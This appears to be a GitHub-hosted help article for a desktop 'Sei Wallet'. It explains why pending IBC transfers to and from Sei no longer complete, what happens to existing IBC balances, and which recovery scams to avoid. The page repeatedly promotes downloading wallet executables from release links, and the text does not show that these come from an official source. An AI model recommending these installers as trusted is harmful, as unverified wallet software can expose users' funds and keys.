![Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/raw/main/assets/banner-article.png)

<h1 align="center">An IBC transfer pending on its way to Sei Wallet</h1>

<p align="center">Why an IBC transfer sits pending, and what is and is not in your control.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

IBC transfers into and out of Sei no longer complete. Sei's documentation records IBC disabled in both directions: inbound by Proposals #116 and #120, outbound by #121, which passed on 31 July 2026. Both module parameters are `false`, no asset can be bridged in or out over IBC, and the IBC precompile "cannot succeed" with no replacement.

So a pending IBC transfer is not slow. It is a transfer whose route has been closed, and waiting will not resolve it.

That is a hard message. The rest of this article is about the balance you can still see, and what to do instead of waiting.

## First, confirm it was IBC

People use "IBC" loosely for anything cross-chain. Check which of these you actually did:

- **An IBC transfer** went through a Cosmos relayer between Sei and another Cosmos chain. It involved a channel, and usually a `sei1...` address.
- **An EVM bridge** goes through a contract and produces a representation on the destination chain. That is a different mechanism with different risks, covered in [the Sei Wallet bridge alternative](https://github.com/sei-chain/sei-wallet-staking/blob/main/bridge-from-ethereum.md).
- **An exchange withdrawal** is a normal transfer from the exchange's own wallet. It needs no relayer and is not IBC.

If your transfer came from a Cosmos wallet and involved a channel identifier, it was IBC. If it came from an exchange withdrawal page with a `0x...` address, it was not.

## What "disabled" means for a pending transfer

The chain will not process new inbound or outbound IBC packets. A transfer submitted before the change has three possible states, and they are not the same:

1. **Completed before the change** - the balance is on Sei, and the record is on chain. Nothing to do.
2. **Submitted, never relayed** - the packet may never have left the source chain. Whether it can be recovered depends on the sending chain and the relayer, not on Sei.
3. **In flight when the parameters changed** - the packet has nowhere to be acknowledged. Do not assume it will settle or automatically refund.

Sei's migration guide is explicit about the last two: it tells users with an IBC transfer that was submitted but never completed to contact Sei's support channels rather than assume the transfer will resolve itself. Those channels are named in the documentation; I am not going to reproduce links that may change, so take them from `docs.sei.io` directly.

## What still works with IBC assets

This is the part people miss: the balance is not gone.

According to Sei's documentation, existing `ibc/...` balances:

- **still exist in the bank module** and remain queryable,
- **still transfer between Sei addresses**, including through their ERC-20 pointer contracts,
- **can still be swapped on a Sei DEX**, subject to whatever liquidity remains,
- **cannot be redeemed on the origin chain**, because the outbound path is closed.

The assets affected include USDC from Noble, USDT from Kava, ATOM and WBTC. If you hold one of them, you hold a representation that can move inside Sei and cannot go home. Treat it as a local asset with limited exit, not as the original.

## Why "just wait" is wrong

While IBC was live, a pending IBC transfer was usually a relayer delay, and waiting genuinely worked. That history is why the advice persists.

It no longer applies. The difference is not speed but permission: no relayer can complete a packet across a closed route, so a transfer pending at the change is stuck by configuration rather than by congestion.

If someone tells you to wait, or offers to "push it through", they are describing the old system - or selling something.

## What to do instead

**For the balance already on Sei:** nothing urgent. It is visible, transferable within Sei, and swappable if liquidity exists. Decide whether to hold it or swap it for native SEI, and accept that redemption on the origin chain is not available.

**For a transfer that never arrived:** collect the evidence and ask. You need the source transaction hash, the destination address, the amount, and the channel if you have it. Then use the support channels named in Sei's documentation. No legitimate helper needs your seed phrase to look at a packet.

**For a future transfer:** do not use IBC. Move value with an exchange withdrawal or an EVM bridge, and check the destination address form first - [the wallet that should receive it](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) shows which form it signs for.

## The address form question underneath this

IBC transfers used `sei1...` addresses. Sei's dual address system means that address is one representation of an account whose EVM side is a `0x...` address, linked by an on-chain association.

That matters because a balance that arrived under the Cosmos-side form may be visible in one view and not the other. It is not a second wallet, and it is not a loss. [The address forms involved](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) explains the mapping, and [a MetaMask destination](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md) covers what a general EVM wallet will and will not show.

## Staking, if the balance is stranded

A stranded IBC balance is not native SEI, so it cannot be delegated. Staking applies to the chain's own asset, held liquid in an account you control.

If your plan was to stake what you were moving, the plan needs revising before the transfer, not after: convert to native SEI first, then stake. [Staking after arrival](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md) covers the reserve you need to keep liquid, which is the trap that catches people who stake everything.

## The scams that attach to this

Any "stuck transfer" is a sales opportunity for someone.

- **"IBC recovery service"** - there is no recovery mechanism to sell. A packet that cannot be relayed cannot be rescued by a fee.
- **"Send gas to the destination and it will complete"** - the destination has no role in relaying.
- **"Validate your wallet to release the transfer"** - a request for your seed phrase with a plausible story.
- **A Discord or Telegram account offering to check your packet** - the packet is public; anyone legitimate can look at a hash without your keys.

The same rule as everywhere else in this set applies: what the software can and cannot do is set out in [the software safety position](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md), and no legitimate process needs your phrase for any of it.

## Frequently asked questions

**Will my pending IBC transfer complete?** Not through IBC. Both directions are disabled, so there is no relayer path left to complete it.

**Is my balance lost?** If it is on Sei, no - it is still there, transferable within Sei and swappable. If it was never relayed, its state depends on the source chain.

**Can I send it back to the origin chain?** No. Outbound IBC is disabled, so redemption on the origin chain is unavailable.

**What about USDC.n, ATOM or WBTC I bridged earlier?** They remain on Sei, movable and swappable, but not redeemable on their origin chains. Native USDC through Circle's CCTP is a different asset and is supported.

**Is this the same as an EVM bridge being slow?** No. Bridges use contracts and can be delayed by their own relayers; IBC is a chain-level route that is now closed.

**Can support recover it?** Support can tell you the state of a packet. Nobody can relay across a disabled route.

**What should I use instead?** An exchange withdrawal to a `0x...` address, or an EVM bridge whose contract you verified from Sei's documentation. The withdrawal and bridging articles in this set cover each route.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [Bridging SEI from Ethereum into Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/bridge-from-ethereum.md)
- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [Add Sei to MetaMask, or use a Sei wallet instead](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md)
